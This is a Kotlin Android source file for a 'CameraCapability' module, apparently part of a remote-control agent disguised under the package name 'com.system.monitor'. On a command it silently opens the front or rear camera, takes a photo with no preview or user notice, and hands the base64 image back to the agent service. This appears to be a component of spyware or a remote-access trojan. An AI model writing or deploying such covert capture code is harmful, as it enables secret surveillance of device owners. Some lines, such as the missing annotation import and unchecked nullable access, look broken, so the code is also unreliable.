package com.system.monitor.capabilities

import android.hardware.camera2.*
import android.graphics.ImageFormat
import android.media.Image
import android.media.ImageReader
import android.os.Build
import android.util.Size
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.nio.ByteBuffer
import java.util.concurrent.CompletableFuture

class CameraCapability(private val service: AgentService) : AgentService.Capability {

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private val gson = Gson()
    private var future: CompletableFuture<Map<String, Any>>? = null

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "capture" -> capturePhoto(params.facing ?: 1)
            else -> mapOf("error" to "invalid action")
        }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun capturePhoto(facing: Int): Map<String, Any> {
        cameraManager = service.getSystemService(CameraManager::class.java)
        val cameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return mapOf("error" to "camera not found")

        imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
        future = CompletableFuture()

        cameraManager!!.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                createCaptureSession()
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { future?.complete(mapOf("error" to "camera error $error")) }
        }, null)

        return try { future?.get() ?: mapOf("error" to "timeout") } catch (e: Exception) { mapOf("error" to e.message) }
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun createCaptureSession() {
        val outputSurface = imageReader!!.surface
        cameraDevice!!.createCaptureSession(listOf(outputSurface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                captureSession = session
                val request = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                    addTarget(outputSurface)
                }.build()
                session.capture(request, object : CameraCaptureSession.CaptureCallback() {
                    override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                        val image = imageReader!!.acquireLatestImage() ?: return
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        future?.complete(mapOf("image" to android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)))
                        cleanup()
                    }
                }, null)
            }
            override fun onConfigureFailed(session: CameraCaptureSession) {
                future?.complete(mapOf("error" to "configure failed"))
            }
        }, null)
    }

    override fun cleanup() {
        captureSession?.close()
        cameraDevice?.close()
        imageReader?.close()
    }

    data class Params(val action: String, val facing: Int? = null)
}